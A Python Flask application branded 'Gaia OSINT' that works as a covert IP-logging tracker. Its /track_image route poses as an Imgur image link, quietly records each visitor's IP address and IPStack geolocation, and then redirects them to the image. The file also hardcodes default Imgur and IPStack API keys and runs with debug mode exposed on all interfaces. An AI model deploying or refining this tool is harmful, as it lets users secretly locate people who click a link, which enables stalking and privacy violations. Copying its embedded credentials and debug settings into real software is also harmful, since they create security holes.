from flask import Flask, request, jsonify, redirect
import requests
import os
from dotenv import load_dotenv
from cachetools import TTLCache
import ipaddress

# Cargar las variables de entorno desde el archivo .env
load_dotenv()

app = Flask(__name__)

# Configuración de la API de Imgur y geolocalización con valores por defecto
DEFAULT_IMGUR_CLIENT_ID = 'f2acd61ca6a4b03'
DEFAULT_IPSTACK_API_KEY = '0902c6d29b2eb5453520bcaf0dbe4424'

# Leer las claves API desde el archivo .env si existen, de lo contrario usar las claves por defecto
IMGUR_CLIENT_ID = os.getenv('IMGUR_CLIENT_ID', DEFAULT_IMGUR_CLIENT_ID)
IPSTACK_API_KEY = os.getenv('IPSTACK_API_KEY', DEFAULT_IPSTACK_API_KEY)

# Verificación de que las claves estén configuradas
if not IMGUR_CLIENT_ID or not IPSTACK_API_KEY:
    print("Faltan claves de API. Verifica que tus claves estén configuradas correctamente.")

# Caché de imágenes subidas (TTL de 24 horas, max 100 imágenes por IP)
image_cache = TTLCache(maxsize=100, ttl=86400)

# Validar IP
def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# Obtener la geolocalización usando IPStack
def get_geolocation(ip):
    if not validate_ip(ip):
        return None
    
    url = f"http://api.ipstack.com/{ip}?access_key={IPSTACK_API_KEY}"
    response = requests.get(url)
    
    if response.status_code == 200:
        return response.json()
    return None

# Ruta para generar el enlace de Imgur y capturar la geolocalización
@app.route('/track_image/<image_id>')
def track_image(image_id):
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    # Obtener la geolocalización del usuario
    geolocation = get_geolocation(user_ip)

    # Imprimir la geolocalización en la consola para rastrearla
    if geolocation:
        print(f"IP: {user_ip}, Geolocalización: {geolocation}")

    # Redirigir al enlace de la imagen en Imgur
    imgur_link = f"https://i.imgur.com/{image_id}.jpeg"
    return redirect(imgur_link)

# Ruta para ver las imágenes subidas por el usuario
@app.route('/my_images')
def my_images():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    if user_ip in image_cache:
        return jsonify({'images': image_cache[user_ip]}), 200
    else:
        return jsonify({'message': 'No has subido imágenes recientemente.'}), 200

# Ruta principal para mostrar una página de inicio
@app.route('/')
def index():
    return "<h1>Bienvenido a Gaia OSINT</h1><p>Por favor, sube una imagen o accede a /track_image/&lt;image_id&gt; para rastrear la geolocalización.</p>"

# Función para imprimir el arte ASCII y un mensaje de bienvenida
def print_ascii_art():
    art = r"""
     _______ ______    ______   ______  _______ 
    |   _   |   _  \  |   _  \ |   _  \|   _   |
    |  |_|  |  |_|  | |  |_|  ||  |_|  |  |_|  |
    |       |   ___/  |   ___/ |   _   |       |
    |___|___|__|      |__|     |__| |__|___|___|
    
                  By Gaia OSINT
    """
    print(art)
    print("\nBienvenido a Gaia OSINT")
    print("\nPara usar este programa, sigue estos pasos:")
    print("2. Haz un uso responalbe en un entorno controlado. BO-ot e If se eximen de cualquier mal uso del programa.")
    print("3. Sube una imagen accediendo a la URL base de la aplicación.")
    print("4. Para rastrear la geolocalización de un usuario que acceda a una imagen, usa /track_image/<image_id>.")
    print("\n¡Disfruta usando Gaia OSINT!\n")

if __name__ == '__main__':
    # Imprimir el arte ASCII y la bienvenida
    print_ascii_art()

    # Iniciar la aplicación en el puerto asignado por Heroku
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
